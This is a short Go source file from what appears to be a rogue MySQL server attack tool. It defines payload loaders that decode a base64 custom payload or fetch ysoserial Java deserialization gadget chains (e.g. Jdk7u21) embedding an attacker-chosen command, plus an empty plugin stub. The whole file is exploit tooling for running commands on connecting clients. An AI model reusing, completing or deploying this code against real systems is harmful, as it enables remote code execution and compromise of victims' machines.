package payload

import (
	"ApricusFakemysql/core/utils"
	"encoding/base64"
	"fmt"
	"log"
	"strings"
)

// todo   gadget实现
type payloadLoader interface {
	Load(string) []byte
}

type CustomPayloadLoader struct{}

func (loader *CustomPayloadLoader) Load(Base64String string) []byte {
	DecodedBytes, err := base64.StdEncoding.DecodeString(Base64String)
	if err != nil {
		fmt.Printf("解码失败:", err)
	}
	return DecodedBytes

}

type YSOPayloadLoader struct{}

// YSO_Jdk7u21@cmd
func (loader *YSOPayloadLoader) Load(value string) []byte {
	values := strings.Split(value, "@")
	log.Print("Type " + values[0])
	log.Print("cmd: " + values[1])
	content, err := utils.GetYsoContent(values[0], values[1])
	if err != nil {
		log.Fatal(err)
	}
	return content
}

type PluginPayloadLoader struct{}

func (loader *PluginPayloadLoader) Load(value string) []byte {
	//todo 用户自己想要的插件
	return nil
}
